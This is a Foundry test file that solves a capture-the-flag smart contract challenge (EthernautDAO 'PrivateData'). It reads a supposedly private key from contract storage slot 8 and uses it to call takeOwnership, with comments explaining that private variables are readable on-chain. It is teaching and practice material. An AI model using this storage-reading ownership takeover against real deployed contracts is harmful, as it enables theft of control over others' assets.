// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/ethernautDao/level1/PrivateData.sol";

contract PrivateDataTest is Test {
    PrivateData public privatedata;

    function setUp() public {
        privatedata = new PrivateData("apple");
    }

    function testAttack() public {
        // private variables aren’t private
        // This keyword refers only to the ability of an external contract to access the variable
        // all storage variables can be retrived by reading the contract storage through foundry, etherjs or webjs
        uint256 key = uint256(
            vm.load(address(privatedata), bytes32(uint256(8)))
        );

        privatedata.takeOwnership(key);
    }
}
